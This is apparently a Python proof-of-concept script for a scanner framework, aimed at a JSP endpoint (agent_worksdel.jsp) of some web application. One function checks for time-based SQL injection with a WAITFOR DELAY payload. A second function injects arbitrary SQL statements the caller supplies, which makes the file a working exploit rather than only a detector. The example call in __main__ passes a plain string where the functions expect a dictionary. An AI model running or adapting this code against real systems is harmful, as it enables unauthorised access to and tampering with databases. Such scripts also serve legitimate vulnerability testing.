import requests
import time

def _verify(target):
    url = target["target"]
    url = url.rstrip('/')
    api_url = f"{url}/worksheet/agent_worksdel.jsp"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
    }
    # 发送正常请求获取基准时间
    try:
        start = time.time()
        resp_normal = requests.get(api_url, params={'id': '1'}, headers=headers, timeout=10, verify=False)
        normal_time = time.time() - start
    except Exception:
        return None
    # 发送带延时注入的请求
    payload = "1';WAITFOR DELAY '0:0:8'--"
    try:
        start = time.time()
        resp_delay = requests.get(api_url, params={'id': payload}, headers=headers, timeout=10, verify=False)
        delay_time = time.time() - start
    except Exception:
        return None
    # 如果延时请求显著慢于正常请求（>=6秒），则存在注入
    if delay_time - normal_time >= 6:
        return {'target': url, 'result': f'SQL注入漏洞存在，延时请求耗时{delay_time:.2f}秒，正常请求耗时{normal_time:.2f}秒'}
    return None

def _code_exc(target, cmd):
    url = target["target"]
    url = url.rstrip('/')
    api_url = f"{url}/worksheet/agent_worksdel.jsp"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    # cmd 是用户输入的SQL语句（例如 '1\' UNION SELECT 1,2,3--'）
    payload = f"1';{cmd}--"
    try:
        start = time.time()
        resp = requests.get(api_url, params={'id': payload}, headers=headers, timeout=10, verify=False)
        elapsed = time.time() - start
        return {'target': url, 'result': f'SQL语句执行，响应耗时{elapsed:.2f}秒，响应长度{len(resp.text)}'}
    except Exception as e:
        return {'target': url, 'result': f'执行出错：{str(e)}'}

if __name__ == "__main__":
    print(_verify('http://example.com'))